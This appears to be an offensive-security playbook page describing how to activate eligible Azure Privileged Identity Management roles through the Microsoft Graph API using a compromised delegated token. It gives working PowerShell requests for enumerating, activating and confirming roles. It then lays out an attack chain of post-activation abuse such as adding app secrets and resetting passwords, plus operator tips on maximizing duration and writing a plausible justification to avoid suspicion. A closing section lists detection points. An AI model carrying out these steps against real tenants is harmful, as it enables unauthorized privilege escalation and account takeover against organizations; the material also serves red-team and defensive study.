## Overview

Privileged Identity Management (PIM) converts permanently active privileged roles into time-bound eligible assignments. A user with an eligible role must explicitly activate it — normally through the Azure portal, optionally with justification text, MFA, or admin approval depending on role settings.

With a compromised delegated Graph token that has the right scopes, this activation can be performed directly via API. No portal interaction is needed. If the eligible role is configured without approval requirements, activation is immediate. If MFA is required, the compromised token session must already satisfy it — which is typical for tokens acquired via DCF phishing or Evilginx.

## Preconditions

| Requirement | Detail |
|---|---|
| Delegated Graph token for the identity | Must correspond to the identity that holds the eligible assignment |
| `RoleEligibilitySchedule.Read.Directory` | To enumerate available eligible roles |
| `RoleAssignmentSchedule.ReadWrite.Directory` | To submit the activation request |
| Eligible assignment exists | Identity must have the role as *eligible* (not *active*) in PIM |
| Activation conditions | If role requires approval or additional MFA, those must be satisfied separately |

## Enumerating Eligible Roles

```powershell
$params = @{
    Method  = "GET"
    Uri     = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?`$filter=principalId eq '<USER_OBJECT_ID>'"
    Headers = @{ Authorization = "Bearer $Graph" }
}
$eligible = (Invoke-RestMethod @params).value

$eligible | Select-Object @{n="Role";e={$_.roleDefinitionId}},
                           @{n="Scope";e={$_.directoryScopeId}},
                           @{n="MemberType";e={$_.memberType}},
                           @{n="Expires";e={$_.scheduleInfo.expiration.endDateTime}} | Format-List
```

The `directoryScopeId` determines effective scope — `/` means tenant-wide, a specific object ID means scoped to that group, AU, or resource.

## Activating the Role via API

```powershell
$body = @{
    action           = "selfActivate"
    principalId      = "<USER_OBJECT_ID>"
    roleDefinitionId = "<ROLE_DEFINITION_ID>"
    directoryScopeId = "<SCOPE_OBJECT_ID>"   # "/" for tenant-wide
    justification    = "Operational requirement"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        expiration    = @{
            type     = "AfterDuration"
            duration = "PT1H"    # PT5M, PT30M, PT1H, PT8H — within role's max
        }
    }
} | ConvertTo-Json -Depth 5

$params = @{
    Method  = "POST"
    Uri     = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
    Headers = @{ Authorization = "Bearer $Graph"; "Content-Type" = "application/json" }
    Body    = $body
}
$result = Invoke-RestMethod @params
# status: Provisioned → role is active
```

## Confirming Activation

```powershell
$params = @{
    Method  = "GET"
    Uri     = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentSchedules?`$filter=principalId eq '<USER_OBJECT_ID>' and status eq 'Provisioned'"
    Headers = @{ Authorization = "Bearer $Graph" }
}
(Invoke-RestMethod @params).value | Select-Object roleDefinitionId, directoryScopeId, status | Format-List
```

## Attack Chain

```
Compromised delegated token (Graph)
     ↓
Enumerate eligible roles → GET roleEligibilitySchedules
     ↓
Identify target role + scope + conditions
     ↓
POST roleAssignmentScheduleRequests (selfActivate)
     ↓
Status: Provisioned → role is active for configured duration
     ↓
Exercise privilege within the window:
  - App Admin     → add client secret to app registration
  - User Admin    → reset user passwords
  - Group Owner   → modify group membership
  - Billing Admin → access subscription billing data
     ↓
Role auto-expires after duration → no manual cleanup needed
```

## Operator Notes

- Duration is bounded by the role's configured maximum — request the maximum allowed to extend the window.
- If approval is required (`isApprovalRequired: true` in role settings), the activation enters a pending state and notifies approvers — it does not immediately provision. Check role settings during recon before activating.
- The `justification` field is logged but not validated. Use a plausible value consistent with the identity's expected behavior.
- After activation, verify the role is active before attempting privileged operations — propagation can take a few seconds.
- The activation event is audited under PIM in the Audit Log regardless of how it was submitted (portal or API).

## Detection / Friction Points

- PIM activation always generates an audit event — `Activate PIM eligible role` with actor, role, scope, duration, and justification.
- If the role configuration sends notifications on activation (common for high-privilege roles), the legitimate role owner or an admin may receive an alert email immediately.
- API-based activation is indistinguishable from portal-based activation in the log — same event type, same fields.
- Organizations using PIM alerts (`Roles are activated too frequently` or `Roles are activated outside normal hours`) may detect the activation.
